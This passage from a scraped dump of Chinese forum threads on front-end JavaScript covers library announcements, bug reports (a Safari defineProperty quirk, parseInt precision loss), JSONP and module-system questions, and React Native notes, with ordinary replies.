href=\"javascript:tran.setLang('default');\"&gt;English&lt;/a&gt;\n&lt;a href=\"javascript:tran.setLang('jp');\"&gt;日本語&lt;/a&gt;\n&lt;a href=\"javascript:tran.setLang('cn');\"&gt;中文&lt;/a&gt; \n</code></pre>\n<p>可以通过 URL 穿参数设置语言</p>\n<pre><code>http://127.0.0.1:9005/test/test.html?lang=jp\n</code></pre>\n<h2>文本翻译添加</h2>\n<pre><code>&lt;div&gt;\n    这里是中文\n    &lt;!--{jp}ここは日本語です--&gt;\n    &lt;!--{en}Here is English--&gt;\n&lt;/div&gt;\n</code></pre>\n<h2>图片切换</h2>\n<pre><code>&lt;img alt=\"images\" src=\"../img/imgae.jpg\" data-lang-cn=\"../img/imgae_cn.jpg\" data-lang-jp=\"../img/imgae_jp.jpg\" /&gt;\n</code></pre>\n</div></div>"], "reply": "28", "tittle": "Translater.JS 巧用 HTML 注释翻译页面，是不是很酷？", "comment": ["赞，挺不错的，很有意思", " 小创意 😄", "思路不错，不过相对于注释，用 data-* 来做更合适一些，因为 HTML 压缩的时候一般会选择清除注释。", " 如果`<div>dssdds<i>sdd</i></div>` 这个样子放到`data-*` 会把标签弄没了...", "感觉一点也不好，有没有考虑过优化。如果你就后台用用当我没说", "  seo 优化", "创意很好，但是实际上无卵用，因为多语言的网站不仅仅是文字差别，还有文化差别，你要展现给别人的内容也不一样，所以一般都是做 N 套网站", " 那倒是，虽然是这个样子，但是也有部分网站你切好多个国家 样式都是一样的，比如 ", " 。虽然没有什么卵用，但是偶尔临时解决方案很不错的哦。只是把自己的灵感实现出来，没有什么别的意图 😄", "注释容易被压缩清掉，建议换成 script 标签", " 翻译的是文本，不应该包含标签", " 好想法，可以配置一下通过 script 或者注释来切换。😄  我建个 issue 回头撸起来", "好方便啊，有种 web 版的 lang.ini 的感觉", " 来这里搜集一点创意", "非常好的创意 是一款轻量级简化的翻译方式，我曾经也 get 过注释来生成内容， star !", "这点子确实不错！现在也有很多是放在 noscript 里面的。", "很酷", "对于小项目确实是个便捷的办法，已 star~", "插嘴问一下：\r", "\r", "正文上方那一排 svg 可以在哪里找到？", " \r", "\r", "这个是我弄的傻傻的纯静态： ", " \r", "\r", "这个是国际大品牌动态的： ", " 没错，我主要是想，多语言这么有用的东西，如果这么多年都没有人做，那一定是有他存在的缺陷，我又仔细看了一下苹果的内容，比如销售策略，他每个国家的条款都不一样，只不过因为全局保持了一样的布局而已。的却按楼上各位大神回复，作为小网站用用还是不错的，但是内容一多，实际上每个页面就加载了三倍的文字数据量（假设 3 种语言。。）\r", "而且你看到了，苹果的英文和中文是差了 apple tv 的。。所以说多语言并不是简单的文字翻译，很多细节没法用插件实现", " 嗯，我只是实现了我的一个想法。只是在工作中，用到翻译，只是简单的解决翻译问题，不是为了替换常规的翻译 方法，你想多了。😄", "这东西的思路感觉就和响应式布局似得。\r", "先把所有数据都下载下来，再按具体情况选择显示哪部分。\r", "\r", "问题就是有可能把用户并不需要的代码等也下载了，会占用更多的带宽和流量。", "写过类似的，不过语言表加载的是 json ，可以结合异步来加载再翻译。\r", "无依赖，同样适合小项目。\r", "github ： ", " 木有文档 :-O", " 是滴。存在总会是有理由的。", " 的确。因为觉得就是个自己用的小工具……我还是修改一下再加文档吧……", "总觉得有点不妥，觉得这种还是放在后端比较合适，如果是一段文字，也是用 xhr 请求，如果实在极小的地方就用标签切换不就好了 为什么用注释呢，注释还是仅仅与代码相关而与内容无关的吧。。", " 也没有什么不妥，总有用得着的地方。比如： ", "  放到 Github 用起来很方便咯😄 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>首先安利下自己写的 Cordova/PhoneGap 插件\n<a href=\"https://github.com/TongChia/cordova-plugin-pingpp\" rel=\"nofollow\">Cordova Ping++ Plugin</a></p>\n<p>然后是想让大家在有闲情的情况下帮忙测试下我的插件\n尤其是全功能版本</p>\n<pre><code>$ cordova plugin add <a href=\"https://github.com/TongChia/cordova-plugin-pingpp.git#all\" rel=\"nofollow\">https://github.com/TongChia/cordova-plugin-pingpp.git#all</a>\n</code></pre>\n<p>比如在 Visual Studio 下安装会不会出问题啊 百度钱包能不能正常使用啊 ...\n先谢谢啦～</p>\n<p><a href=\"https://www.pingxx.com/\" rel=\"nofollow\">Ping++</a>是一个支付聚合 SDK 基本上支持所有的主流支付方式\n我跟它并没有关系 用它做个俩个外包项目 做的不错</p>\n</div></div>"], "reply": "3", "tittle": "Cordova Ping++ 插件 (支付宝、微信支付、ApplePay、银联......)", "comment": ["ping++只能是公司用吧", "不错", "应该跟 ping++官方联系啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://jaywcjlove.github.io/validator.js\" rel=\"nofollow\">validator.js 官网 =&gt; 实例应用</a></p>\n<p><a href=\"https://github.com/jaywcjlove/validator.js\" rel=\"nofollow\"><img alt=\"\" src=\"http://jslite.io/sb/github/green-alt.svg\"></a>\n<a href=\"https://travis-ci.org/jaywcjlove/validator.js\" rel=\"nofollow\"><img alt=\"Build Status\" src=\"https://travis-ci.org/jaywcjlove/validator.js.svg?branch=master\"></a> <img alt=\"\" src=\"http://jaywcjlove.github.io/sb/status/no-dependencies.svg\"> <a href=\"#\" rel=\"nofollow\"><img alt=\"\" src=\"http://jaywcjlove.github.io/sb/ico/bower.svg\"></a> <a href=\"https://www.npmjs.com/package/validator.tool\" rel=\"nofollow\"><img alt=\"\" src=\"http://jslite.io/sb/ico/npm.svg\"></a></p>\n<p>轻量级的 JavaScript 表单验证，字符串验证。没有依赖，支持 UMD ，<code>~3kb</code>。最主要原因是来骗 star 的。😄</p>\n<pre><code># npm 安装\n$ npm install validator.tool --save\n# bower 安装\n$ bower info validator.tool\n</code></pre>\n<p>在 <code>.js</code> 文件中调用</p>\n<pre><code>// 字符串验证\nvar validator = require('validator.tool');\nvar v = new validator();\nv.isEmail('wowohoo@qq.com');\nv.isIp('192.168.23.3');\nv.isFax('');\n\n// 表单验证\nvar a = new validator('example_form',[\n    {\n        //name 字段\n        name: 'email',\n        display:\"你输入的不{{email}}是合法邮箱|不能为空|太长|太短\",\n        // 验证条件\n        rules: 'is_emil|max_length(12)'\n        // rules: 'valid_email|required|max_length(12)|min_length(2)'\n    },{\n        //name 字段\n        name: 'sex',\n        display:\"请你选择性别{{sex}}\",\n        // 验证条件\n        rules: 'required'\n    }\n],function(obj,evt){\n    if(obj.errors){\n        // 判断是否错误\n    }\n})\n</code></pre>\n</div></div>"], "reply": "10", "tittle": "轻量级的 JavaScript 表单验证，字符串验证 validator.js 骗 star 来的😄", "comment": ["Chrome 49.0.2623.87 m 进官网 100% 被抖挂", " 不是吧这个是 一个 CSS 3 动画", "两个 bower ", " ", "建议增加 i18n 的支持", " 好了 😄", " 如何设计调用嘞？", "邮件地址不支持大写，不支持+。", " 😘 感谢", " 👏"]},
{"content": ["<div class=\"topic_content\">我记得 jsonp 原理是创建一个 script 标签然后，然后在结果中执行一个已经写好的函数。\r<br>但用 chrome 观察 jquery jsonp 请求的时候，没有创建 script 标签，请求也是采用 xhr 的方式请求的，不知道是我理解错了，还是 jsonp 有新的协议可用了？</div>"], "reply": "8", "tittle": "jquery jsonp 请求用了新协议？", "comment": [" 这是源码，看不懂。。。", "源码还是用 script 标签", "你看的是不是跨域 json CORS?", "callback 只想完毕，会自动从 window 上删除， script 标签也是", "去年遇到过一个问题专门分析过这段代码,如果我没记错,JSONP 内部调的是 getScript,getScript 内部又调了$.ajax,然后 getScript 这个函数里面进行了一些判断,会尝试能否把 js 用 xhr 请求下来,如果能请求下来,拿到源代码,跟据是否有'use script'模式选择 eval 还是插入 script 标签,总之判断条件比较复杂,但是可靠性非常高.\r", "\r", "说一下我当时遇到的情况,我用 jQuery 加载 html 片段直接到页面上面,然后这个 html 片段里面有 script:src 标签,jQuery 为了保证可用性是会运行 script 里引用的这个里面的 js 文件的,而且还能保证运行顺序!运行方式就是我上面说的这样,所以猜测你可能也遇到了相同或者类似的情况", "看这个文件， script 的操作在这里面\r", "所以 jquery 的 jsonp 并没有使用神奇的“新技术”，只是闭包把你绕晕了", "对不起了各位，我测试的时候的的确没有跨域，可能就像\txieranmaya 说的，虽然用了 jsonp ，但没有跨域所以走的还是 xhr 。感谢 @", " @", " \r", "\r", " 感谢\r", " 感谢，看了你说的源码，我自己又测试一下，走的是 script 。\r", "对不起了各位，没好好测试就下了结论。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>主要目的是让后端返回 json 来控制浏览器，爱弹框弹框，爱跳转跳转，爱刷新浏览器就刷新浏览器，爱执行 js 就执行 js.....</p>\n<p>项目地址： <a href=\"https://github.com/Yusoo/ajaxpost\" rel=\"nofollow\">https://github.com/Yusoo/ajaxpost</a></p>\n<p>才开始玩 github ，求点 star 啊   o(≧v≦)o~~</p>\n</div></div>"], "reply": "21", "tittle": "撸了一个 ajax 提交表单的轮子，求点儿 star~.~", "comment": ["是不是相当于 $.post().done(function (r){eval (r.code);});", "都引入 jQuery 了, 自带的 ajax 不够用?", "自带的 ajax 还是得写不少代码啊，这个轮子只要写好 form 就行了", "js 党还真浮躁， 随手写几十行代码就来求 star 。", "对于 js 党来说，你应该撸这样的轮子  ", " 求 star ？ 😄", "ajax 可以上传文件吗？", " 就是懒得在前端也写这么多验证，反正后端也必须验证，直接显示后端的验证结果不久好了么", " 在 datas 里面传 FormData 可能可以哈，不过我没试过", "还用了 jQuery …\r", "我可没丢不起去 start 这个人…", "天！！！这也能求 STAR ，我能告诉你，我非常不喜欢用 form 提交表单吗？如果不用 from 提交表单这个还有用吗？如果是传文件，如果回传数据不是 JSON 呢？如果。。。。。。。。。。。我只想告诉你，这样的封装在大的项目里复用的机会可能有个位数吧。", " 已 start fork~", "确实可以直接传 formData ，这是 HTML5 的标准，文件啊什么的也可以直接用 ajax 传", " 提高用户体验前端先验证一下", "jquery 都进来了。。。还不够么。。除非你不用 jquery ，这样还算是一个移动端勉强的小插件吧（属于自用那种。。）", "我用 jquery + jquery validate + jquery form", "这。。。希望楼主再接再厉，拿出更好的轮子", "我是不喜欢用 form 的前端", " 已 star", " 能以数组形式一次性验证多个非空吗？", " 好像不行诶"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>是不是很酷的样子， <a href=\"http://jsdig.com/\" rel=\"nofollow\">http://jsdig.com/</a></p>\n<p><img alt=\"\" src=\"https://segmentfault.com/img/bVuvkQ\"></p>\n<p><img alt=\"\" src=\"https://segmentfault.com/img/bVuvkL\"></p>\n<h1>方法一</h1>\n<ul>\n<li><code>Fork</code> 到自己仓库</li>\n<li>修改根目录的<code>data.json</code>文件</li>\n<li><code>Pull requests</code> 给我 哈！哈！哈！</li>\n</ul>\n<pre><code>{\n    // 必填－名字\n    \"name\":\"JSLint\", \n    // 必填－网址\n    \"url\":\"<a href=\"http://jslint.com/\" rel=\"nofollow\">http://jslint.com/</a>\", \n    // 选填－图标\n    \"ico\":\"<a href=\"http://easings.net/favicon.png\" rel=\"nofollow\">http://easings.net/favicon.png</a>\",\n    // 必填－可以留空 － 描述说明\n    \"des\":\"在线 JS 校验工具\" ,\n    // 选填－标签，便于归类\n    \"tags\":[\"工具\"]\n}\n</code></pre>\n<h1>方法二</h1>\n<p>给我来个 <code>issue</code> 告诉我，数据填写参考方法一。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "如果你是前端工程师，把你的网站或者你知道的网站加进来吧", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近在进行基于百度地图的开发，发现数据库取出来的数据需要经过百度地图的 Bmap.convertor.translate 方法进行转换才能在地图上正确显示坐标，然而由于点的标签是通过数据库取出来循环遍历添加上去的，而 translate 的回调函数是异步执行的，于是不能按正确的循环顺序给点添加标签。不知道怎么传 stnm （标签名）到回调函数里面去，有 JS 的高手吗，求助！\n代码如下：</p>\n<p>$.ajax({</p>\n<pre><code>\t\ttype : \"POST\",\n\t\tdataType : \"json\",\n\t\turl : \"getStation.action\",\n\t\tsuccess : function(data) {\n\t\t\tdatalist = data['stations'];\n\t\t\tfor (var i = 0; i &lt; datalist.length; i++) {\n\t\t\t\tvar point = new BMap.Point(datalist[i]['lgtd'],datalist[i]['lttd']);\n\t\t\t\tconsole.log(datalist[i]['lgtd'],datalist[i]['lttd']);\n\t\t\t\tvar stnm=datalist[i]['stnm'];\n\t\t\t\tvar convertor = new BMap.Convertor();\n\t\t\t\tvar pointArr = [];\n\t\t\t    pointArr.push(point);\n\t\t\t\tconvertor.translate(pointArr, 1, 5, function(data,stnm){\n\t\t\t\t\tconsole.log(data);\n\t\t\t        if(data.status === 0) {\n\t\t\t          var marker = new BMap.Marker(data.points[0]); \n\t\t\t          var label = new BMap.Label(stnm, {\n\t\t\t\t\t\t\toffset : new BMap.Size(20, -10)\n\t\t\t\t\t\t});\n\t\t\t\t\t\tmarker.setLabel(label);\n\t\t\t\t \t\tmarker.addEventListener(\"click\", attribute); \n\t\t\t\t\t\tmap.addOverlay(marker);\n\t\t\t        }\n\t\t\t\t});\n\t\t\t}\n\t\t}\n});\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "百度地图坐标转换时添加标签的问题", "comment": ["坐标系转换，网上找找转换代码吧，转好了再显示", " 我这个就是转换过程啊，只是转换了之后不知道怎么按循环顺序添加标签，因为转换过程是异步的。", "所以不用它的，自己找算法转", "(`・ω・´)你等回调的过程中 stnm 都变成了最后一只点的 stnm 啦。这个时候我们就要用 let 给参数绑定到不同的作用域，不管风吹雨打 stnm 都是你这个作用域里面的 stnm 啦！\r", "前面加一只 \"use strict\";， 然后把所有 stnm 存到数组 heiheihei[i] 里面，所有在回调里用到的变量（ i ， stnm ）都用 let 来定义，最后一次回调再一起添加标签就好啦（吧\r", "“如果不能用 ES6 那就用匿名函数手动创建作用域吧” (@iskyzh)\r", "\r", "( ´•̥̥̥ω•̥̥̥` )终于有个会的，好激动", " ", " 百度地图论坛的用了个简单的方法解决了我的问题 不过还是谢谢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://jsfiddle.net/smfod698/1/\" rel=\"nofollow\">https://jsfiddle.net/smfod698/1/</a></p>\n<pre><code>var m = '123'.match(/123/)\nalert(m.slice(0))\n\nfunction Cls() {\n    Object.defineProperty(Cls.prototype, \"1\", {})\n}\nnew Cls()\n\nvar m2 = '123'.match(/123/)\nalert(m2.slice(0))\n</code></pre>\n<p>调用 Object.defineProperty()，导致 array.slice() 返回的结果变得不正常了。<br>\n上面的代码，在我的 iPad (iOS 9.2.1)上运行，前一个对话框正常输出 123 ，后一个就只输出空字符串了。</p>\n<p>而且只有当调用 Object.defineProperty() 时传入的是自然数格式的字符串时，才会发生这个问题。<br>\n例如： \"0\"、\"1\"、\"1000\"，一直到 \"4294967294\" 都能触发此问题。\n而 \"00\" 就不会。</p>\n<p>我也测试了 Android 、 Windows 上的浏览器，都没有这个问题。<br>\n现在手头只有一个 iPad ，不知道在其他 iOS 设备上是不是有这个问题。<br>\n有大神知道这是怎么回事吗？</p>\n<p>P.S.<br>\nObject.defineProperty 那段代码来自 Immutable.js 中对 Record 的定义。<br>\n'string'.match(/reg/).slice() 来自 react-router 中匹配路由的代码。<br>\n我的应用里同时使用了这两个类库，然后刚好又给 Record 定义了一个数字格式的字段，然后就发现路由不正常了，调试了一下午才把这个问题给揪出来\norz</p>\n</div></div>"], "reply": "3", "tittle": "iOS 下， Object.defineProperty 的奇怪行为，这是不是 Safari 的 bug？", "comment": ["os x 下的 safari 也有这个问题", "  多谢，看来应该跟 iOS 无关，是 Safari 的问题", "可能是 ios9 和 OS X El Capitan, iOS8 和 Yosemite 的 Safari 都没有问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我用 javascript 做了一个鼠标放上去图标旋转一周的动画效果，单独测试时在 Firefox ， chrome ， ie 下都没有问题，但是放在 discuz 首页框架中，就只有 Firefox 有动画效果，其他浏览器都没反应呢？这是为什么呢？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "关于 javascript 的一个问题，请各位 v 友帮帮忙", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>页面上有一条直线（不一定是水平的），现在当鼠标在其上面移动的时候要获取 mousemove 时的方向与该直线的夹角是多少度，有什么好的思路？\n<a href=\"http://ww1.sinaimg.cn/mw690/69dd3998gw1f2pc5dw886j209g0720sn.jpg\" rel=\"nofollow\">http://ww1.sinaimg.cn/mw690/69dd3998gw1f2pc5dw886j209g0720sn.jpg</a></p>\n</div></div>", "<div class=\"topic_content\">。。明白了，完全没往三角函数的方向去想</div>"], "reply": "8", "tittle": "如何用 js 计算出鼠标移动的方向和某条直线之间的角度？", "comment": ["算出移动方向角度和那条直线的固定角度进行加减的事情", "初中三角函数的问题\r", "只是有个疑问：坐标原点在哪？", "LZ 参考下亚马逊二级菜单的实现原理就明白了~拿个数组记一下鼠标点的轨迹，得出轨迹线角度来算夹角。", "技术上没有问题，唯一就是\"移动的方向\"这个有一点点值得商榷的地方，做复杂点就拟合直线，做简单点大步抽样抽到哪点算哪点\r", "另外好好去学高中数学吧", " 话说是国内还是国外的？好像没看到什么效果在里面", "之前写过一篇 ", " 直接 copy 代码都行", "向量点积公式", " 表示图片链接都挂了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天加班，配合前端工作，前端有一个奇怪的问题，有一个数据从后端取出来后，在随后的接口传给后端，但是这个数据，不知道怎么被改变了，我调试了一下，发现是 parseInt 之后，数据变了，但是我不知道为什么，所以来问一下，有没有兄弟清楚</p>\n<pre><code>        var s = \"62201604091700693\";\n        alert(parseInt(s,10));\n</code></pre>\n<p>alert 出来的数据变成 62201604091700696</p>\n</div></div>"], "reply": "14", "tittle": "javascript， parseInt 结果与原字符串不符", "comment": ["看样子 貌似太长了？", " 应该不是太长了， javascript 的 number 支持很长很长，而且换成 62201604091700700 这种都没问题的", "楼主的这个数字字符串大于 Number.MAX_SAFE_INTEGER 。\r", "\r", "参考链接：<https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/MAX_SAFE_INTEGER>。\r", "\r", "怎么解决等楼下的高人吧...", "超出了 JS 的安全值范围", " \r", " \r", "了解了，谢谢兄弟", "你的串是 56 位的， IEEE-754 安全值是 2^53 - 1, 怎么解决，拆开表示，或者找找 bigint 库，里面应该也是拆开表示", " 谢谢", "不知道这个行不行", "js 在设计上对整数运算是有天然缺陷的\r", "因为为了简单它标准规范里面所有数字都是双精度浮点数\r", "假如它能支持 64bit 整数的话，十进制至少 18 位是没有问题的\r", "有整数运算要求的可以用 jsbn.js\r", "这个库很小，用了做 rsa 什么的都是 ok 的", "还要传给后端而前端自己不用这个数字的话，再传到后端的时候可以考虑还是传 string", " 不知道他们为什么用 int ，前端后端都不是我写的，我只是加班无聊的时候帮着看看", " 好的，标记一下，学习学习", " 谢了兄弟"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我尝试了 bootstrap-timepicker 和 jquery-timepicker.感觉都有点简陋.\n比如,用户输入的时候没有上限设置.\n我想找个类似 Facebook 建 event 时候的那种时间输入.</p>\n</div></div>"], "reply": "8", "tittle": "有没有推荐的 时间输入(小时和分钟) 的方法?[javascript,HTML]", "comment": ["bootstrap-timepicker 是有分钟界面的 不过是五分钟一跳\r", "这种东西。。你想想 60 个值能优雅到哪里去 又不像手机上能做滚轮 最好的就是文本框输入吧", "my97?", "inpumask", "打错，是 inputmask", " 谢谢! 我就是想找这种方法!", " 不是优雅不优雅,是用户用文本框输入的时候,输入框不能及时判断数值是否正确或者不能马上转变成时间.比如,用户可以输入成 1234 这样.只有当鼠标点开了才会转变成 12:34. 我感觉挺不方便的,所以想找个别的 API 看一下.就比如你楼下推荐的 inputmask 那样,可以限定用户输入形式的.", " 我看了下你推荐的,好像是只能输入日期.我是想要时间的输入.不过,谢谢了.", " 可以输入时间的，初始化的时候指定指定格式就行。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>RT 请教大神们一个 JS 相关问题。。。\n就是用怎样用 JS 高效率的遍历出 table 中的 tr 和 td 。。我用的普通 for 循环行和列 1000x1000 的时候吃内存吃的死死的并且很卡。。。\n可能在大神眼里这问题很白痴。。但还是求一个解决办法。。可用 JQuery</p>\n</div></div>"], "reply": "1", "tittle": "请教大神们一个 JS 相关问题。。。", "comment": ["光一个拥有 1,00,000 td 元素的文档大小都 14.1MB 了怎么不卡。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近一直在研究 Android App 的架构，但是考察了 MVP ， MVVM 等框架以后，对于已经非常喜欢\nRuby ， RoR 的简洁风格我来说， Java 世界的繁琐、累赘还是让人爱不起来。</p>\n<p>这时发现了 React 和 React Native 。（为什么去年对这些新技术那么迟钝呢？先自责一下。）</p>\n<p>通过对 React Native 的初步考察和学习，准备在实际项目中使用 React Native ，主要考虑以下几个好处：</p>\n<ul>\n<li>代码量大大减少。（我是个懒人）</li>\n<li>Android 和 iOS 的代码复用程度可以大大增加，而性能上比起嵌入 H5 的那些方案来要好很多。</li>\n<li>调试方便，只要晃晃手机，点下“ Reload JS ”就可以了，省略了 build 的过程，编程-运行-调试的节奏大大加快。</li>\n</ul>\n<p>除了 React Native 外，目前准备在项目中使用的 js 库包括：</p>\n<h5><a href=\"http://redux.js.org\" rel=\"nofollow\">redux</a> 和 <a href=\"https://github.com/reactjs/react-redux\" rel=\"nofollow\">react-redux</a></h5>\n<p>管理 App 的所有状态（ state ）</p>\n<h5><a href=\"https://github.com/gaearon/redux-thunk\" rel=\"nofollow\">redux-thunk</a> redux-thunk 使得</h5>\n<p>redux 可以 <code>dispatch</code> 一个 function ，在这个 function 中完成需要的操作（访问后台\n服务什么的。）</p>\n<p><a href=\"https://wiredcraft.com/blog/native-soundcloud-android-app/\" rel=\"nofollow\">这个 Demo</a>演示了\nredux 和 redux-thunk 在 RN 应用中的使用。</p>\n<p>但是在这个 Demo<code>action</code>函数中返回一个包含<code>type</code>字段的 Object ，然后在\nreducer 中再用 <code>switch</code> 根据 <code>type</code> 去做散列，这是 redux 的本来用法。总感觉\n这不太对。使用了 redux-thunk 以后能不能简化 <code>reducer</code> 的写法呢？</p>\n<h5><a href=\"https://github.com/erikras/redux-form\" rel=\"nofollow\">redux-form</a></h5>\n<p>redux-form 可以用 App state 存放 form 中的数据，还可以在表单提交时完成数据验证。</p>\n<h5><a href=\"https://www.npmjs.com/package/iz\" rel=\"nofollow\">iz</a></h5>\n<p>数据验证功能。主要用来对表单数据进行校验。</p>\n<p>iz 和 redux-form 集成的示例：</p>\n<pre><code>const login_rules = {\n    'login_name': [{ 'rule': 'required',\n                     'error': '请输入登录名。'} \n    ]\n};\n\nfunction createValidator(rules) {\n    return (data) =&gt; {\n        const r = are(rules);\n        return r.validFor(data) ? {} :\n        r.getInvalidFields();\n    };\n}\n\nlet LoginFormContainer = reduxForm({form: 'login',\n                                    fields: ['login_name', 'password'],\n                                    validate: createValidator(login_rules)} )(LoginForm);\n\n\n</code></pre>\n<h5><a href=\"https://github.com/vitalets/react-native-extended-stylesheet\" rel=\"nofollow\">react-native-extended-stylesheet</a></h5>\n<p>在样式中使用变量、百分比、算数表达式等等。</p>\n<h4>几个待研究的问题</h4>\n<h5><em>TODO</em> 如何配置不同环境（开发和发布）中的服务器地址</h5>\n<p>之前在原生的 Android App 中是在 build 阶段根据 build type 将服务器地址写入 string resource:</p>\n<pre><code>  buildTypes {\n    debug {\n      resValue \"string\", \"server_host\", \"测试服务器地址\"\n    }\n\n    release {\n      resValue \"string\", \"server_host\", \"正式服务器地址\"\n    }\n  }\n\n</code></pre>\n<p>然后在应用初始化时从资源表中读取即可。</p>\n<p>目前尚未找到在 RN 中读取 android 资源的方法，而且在 iOS App 中显然不能这么做。目前另\n一种考虑是写一个 NativeModule 提供给 RN 部分，负责提供 App 运行所需要的许多环境信息，\n不限于 build 模式、服务器地址这些。</p>\n<p>比如，我们的 App 运行中需要用到一些设备品牌、型号等信息，\n<a href=\"https://github.com/rebeccahughes/react-native-device-info\" rel=\"nofollow\">react-native-device-info</a>\n可以提供这些，但是提供不了 IMEI 号（ iOS 不需要），这也需要自己写 Native Module 来提供。</p>\n<h5><em>TODO</em> 考察<a href=\"https://github.com/lwansbrough/react-native-camera\" rel=\"nofollow\">reactive-native-camera</a></h5>\n<h5><em>TODO</em> 研究在 RN 中调用支付宝、微信支付等支付应用的方法。</h5>\n<p><a href=\"http://bird-frank.gitcafe.io/2016/04/14/reactnativestudynode/\" rel=\"nofollow\">我的博客中的原文地址</a></p>\n</div></div>"], "reply": "12", "tittle": "React Native 学习笔记", "comment": ["社区去年已经在吹 redux-saga 了", "mark 一下", "也推荐试下\r", "建议了解下 relay ，它会导致 reactive 模式变化。 rn 中调用支付宝只能跳到原生啊。", "为什么不考虑 RubyMotion", "RN 打包成 apk 之后，还是 JS 负责调用原生组件去渲染？\r", "感觉它的唯一进步只是调原生而已，这个速度如何优化才好。如果应用大型了，怎么保证解析速度", " 浏览器在手机中是重头，解析技术上不会落后的。", " 是的，要封装 Native Module", " 目前看好像 RubyMotion 的社区不如 React 啊。另外懂 javascript 的程序员还是比懂 ruby 的多很多。", " 没记错 RubyMotion 是收费的", " 现在有免费版的（限制仅仅是加一个启动画面）用来学习。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>近期对 js 比较感兴趣，就开始研究；有以下问题不是很明白，求指点。</h1>\n<ul>\n<li><code>amd</code>、<code>commonJS</code>、<code>es6</code>、<code>coffeescript</code>对比分析；比如： <code>amd</code>、<code>commonJS</code>使用<code>require</code>； <code>es6</code>中使用<code>import</code>进行<code>module</code>引入,各有什么不同；</li>\n<li>当我使用<code>npm</code>安装对应的<code>js module</code>之后， 怎么加载使用，怎么使用脚手架工具(<code>module handler</code>)将他们打包为普通的<code>js</code>，提供给浏览器使用，提供给其他人调用。</li>\n<li>有什么办法解决他们之间的混用；比如使用 webpack 这些脚手架工具(<code>module handler</code>)， 将<code>coffeescript</code>写的代码和<code>es6</code>进行对接；</li>\n</ul>\n</div></div>"], "reply": "7", "tittle": "amd-vs-commonJS-vs-es6-coffeescript 傻傻分不清", "comment": ["自己的一些理解\r", "#CommonJS\r", "服务器端的 Node.js 规范,允许模块通过 require 方法来同步加载所要依赖的其他模块，然后通过 exports 或 module.exports 来导出需要暴露的接口。不适合在浏览器环境中，同步意味着阻塞加载，会造成浏览器假死；\r", "#AMD\r", "适合在浏览器环境中异步加载模块，在声明模块的时候指定所有的依赖 dependencies ，使用 CommonJS 浏览器端的一种妥协方案。\r", "#EcmaScript6 \r", " 新的 EcmaScript 标准； 编译时就能确定模块的依赖关系，以及输入和输出的变量。 CommonJS 和 AMD 模块，都只能在运行时确定这些东西。好多浏览器还是没有支持， 需要使用 babel 编译为 JavaScript 5 。", "System.js 比较好的解决了各种模块、语言之间的混合开发", "coffeescript 的一种叫法： JavaScript 的方言， 感觉好贴切。", "AMD, CommonJS 都是模块化的规范, 这些都是在 ES6 之前的东西. 本质上没有什么不同, 语法而已, 建议使用 ES6 的语法.\r", "\r", "我觉得楼主对 JavaScript 的模块还不够理解. 我有个工程 A, 引用了 npm 中安装的 B, 然后引用了自己以前写的 C 的部分功能. Webpack 从 A 开始打包, 它帮我自动引入了 B 和 C 的相关功能. 在 A 中这样引用就行:\r", "\r", "import B from 'B'\r", "import C from './C.js'\r", "\r", "---\r", "\r", "JavaScript 的一个特殊的地方就是有 \"polyfill\". 语言太灵活了, 你可以自己构建语法, 翻译到 JavaScript 就行. 方言这种说法也挺贴切, CoffeeScript 是方言, TypeScript 是方言, 可以说 ES6 也是方言. 只要每种方言不写在一个文件中, 就很好对接.", " 非常感谢，您的指点； 可不可以这样理解， coffeescript 这些方言不要混写到同一个文件中； gulp 这类编译工具，将他们统一编译为.js 的普通话， 最后再由 webpack 把这些 js 的普通话组织压缩在一起。当然 webpack 自己可以进行编译工作。", " 可以这样理解. Webpack 是个打包器, 许多功能是一些 modules 帮着实现的, Sass 转 CSS, 热加载什么. 它就是个平台.", " 太感谢了， 经过您的指导，重新梳理了下思路，现在又进一步理解。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>第 82 行开始：<a href=\"http://www.kuaidadi.com/assets/js/animate.js\" rel=\"nofollow\">http://www.kuaidadi.com/assets/js/animate.js</a></p>\n<p><img alt=\"\" src=\"http://ww2.sinaimg.cn/large/8144ca8cgw1f2wc9ed35zj218g0p0tey.jpg\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>突然想到一句话：<code>“Make it work, then make it better”</code>，现在觉得写这代码的人没有错，真的是好叼。</p>\n</div></div>"], "reply": "58", "tittle": "刚刚看到个 JS 代码，卧槽，好叼！！！", "comment": ["为什么第 91 行的高亮不一样？", "请问这是什么 hell?", "哈哈，如果不考虑低版本浏览器， animation 可以写多个动画呀。", " 布吉岛。。。", "效果在哪个链接", "行为艺术？", "异步这样的啦，不要整天就想要弄个大新闻。\r", "避免回调地狱有很多办法，比如 Promise 。", "应该是因为有延迟才想到的这种东西...\r", "\r", "论 ES6 的重要性. ", "promise 表示你们还是要学习一个", "这个吊了好久了", " 首页第 2 屏的动画效果", "像是 Dreamweaver 写的…这水平的确不咋地", "点进去看了看，网页好难看。。", "哈哈哈，典型的 callback hell", "好早以前记得就看过这个了= =", "线上 js 不压缩差评", "Promise 大法好", "我感觉代码写得还行，结构和逻辑挺清晰的。 Promise 不是所有浏览器都支持的，还得引个 polyfill 不是。要我一晚上撸这么个页面出来，我也这么搞。", "我记得很久以前就有这个了, 现在快的还没改?", "Promise 大法好, 退 Callback 保平安", "async.js 